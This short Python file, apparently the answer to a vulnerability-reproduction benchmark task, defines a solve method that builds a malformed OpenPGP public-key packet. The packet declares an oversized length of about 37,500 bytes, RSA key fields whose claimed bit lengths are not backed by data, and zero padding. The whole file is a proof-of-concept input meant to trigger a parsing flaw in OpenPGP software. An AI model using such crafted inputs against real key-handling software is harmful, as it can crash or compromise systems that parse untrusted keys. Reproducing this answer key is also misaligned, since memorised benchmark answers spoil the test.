import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        total_len = 37535
        data_len = total_len - 6
        length_bytes = b'\xff' + struct.pack('>I', data_len)
        poc = b'\xc6' + length_bytes
        data = b'\x04'  # version 4
        data += struct.pack('>I', 0)  # creation time
        data += b'\x01'  # RSA
        # Minimal MPI headers, then pad
        data += b'\x08\x00'  # n: 2048 bits, but short
        data += b'\x01\x00'  # e: 16 bits, 65537 but short
        remaining = data_len - len(data)
        if remaining > 0:
            data += b'\x00' * remaining
        poc += data
        return poc
